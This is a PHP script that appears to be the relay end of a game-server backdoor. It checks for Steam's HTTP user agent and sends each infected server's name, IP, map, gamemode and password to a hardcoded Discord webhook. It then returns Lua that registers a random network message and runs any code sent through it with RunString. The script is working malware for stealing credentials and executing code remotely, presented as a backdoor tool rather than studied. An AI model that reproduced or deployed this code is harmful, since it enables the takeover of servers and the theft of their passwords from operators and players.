<?php
// Relay Information
$server_name = $_POST['server_name'];
$server_ip = $_POST['server_ip'];
$server_map = $_POST['server_map'];
$server_gamemode = $_POST['server_gamemode'];
$server_pw = $_POST['server_pw'];
if(!$server_pw) { $server_pw = "nil"; }

if($_SERVER['HTTP_USER_AGENT'] == "Valve/Steam HTTP Client 1.0 (4000)") {
    $json_data = json_encode([
        "embeds" => [
            [
                "title" => "",
                "color" => hexdec("#86ffba"),
                "timestamp" => date("c", strtotime("now")),
                "description" => "```Server: $server_name\nServerIp: $server_ip\nMap: $server_map\nPassword: $server_pw\nGamemode: $server_gamemode\n```",
                "footer" => [
                    "text" => "Worst-Backdoors",
                ]
            ]
        ]
    ]);

    $curl=curl_init("https://discord.com/api/webhooks/786039265901543424/ZsmAQWutRytBPLI-peEoMz29FzAkGDRiBsxRclJ5kLBGjiA394TlinwJOU-uNym4TxrL");
    curl_setopt($curl, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
    curl_setopt($curl, CURLOPT_POST, 1);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($curl, CURLOPT_HEADER, 0);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $json_data);
    curl_exec($curl);

    $RandomValue = uniqid(null, true);
    $NetFilePath = fopen('../bin/nets', "a");
    fwrite($NetFilePath, "$RandomValue ");
    echo("util.AddNetworkString('$RandomValue'); net.Receive('$RandomValue', function(len) RunString(net.ReadString()) end)");
}
else {
    echo("fuckoff");
}
?>
